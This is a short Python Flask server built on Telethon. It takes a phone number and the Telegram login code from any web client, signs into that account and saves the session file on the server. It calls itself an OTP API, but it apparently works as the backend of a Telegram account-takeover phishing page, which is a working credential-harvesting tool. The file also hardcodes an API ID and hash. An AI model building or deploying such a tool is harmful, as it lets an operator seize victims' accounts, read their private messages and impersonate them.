from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
import os

app = Flask(__name__)
CORS(app)

API_ID = 20676547
API_HASH = "73ee3c17f64c2cef18f436d2386b9f0f"
SESSION_FOLDER = "sessions"
os.makedirs(SESSION_FOLDER, exist_ok=True)

active_sessions = {}

@app.route("/", methods=["GET"])
def home():
    return jsonify({"success": True, "message": "Telegram OTP API is active on Railway!"})

@app.route("/api/send-otp", methods=["POST"])
async def send_otp():
    data = request.get_json()
    phone = data.get("phone")

    if not phone:
        return jsonify({"success": False, "message": "Phone number is required."}), 400

    session_path = os.path.join(SESSION_FOLDER, phone.replace("+", ""))
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        
        active_sessions[phone] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash
        }

        return jsonify({
            "success": True, 
            "message": "OTP sent to your Telegram successfully!"
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route("/api/verify-otp", methods=["POST"])
async def verify_otp():
    data = request.get_json()
    phone = data.get("phone")
    code = data.get("code")

    if not phone or not code:
        return jsonify({"success": False, "message": "Phone and code are required."}), 400

    session_data = active_sessions.get(phone)
    if not session_data:
        return jsonify({"success": False, "message": "Session expired. Request OTP first."}), 400

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        client.session.save()
        await client.disconnect()
        del active_sessions[phone]

        return jsonify({
            "success": True, 
            "message": "Login successful! Session file created."
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
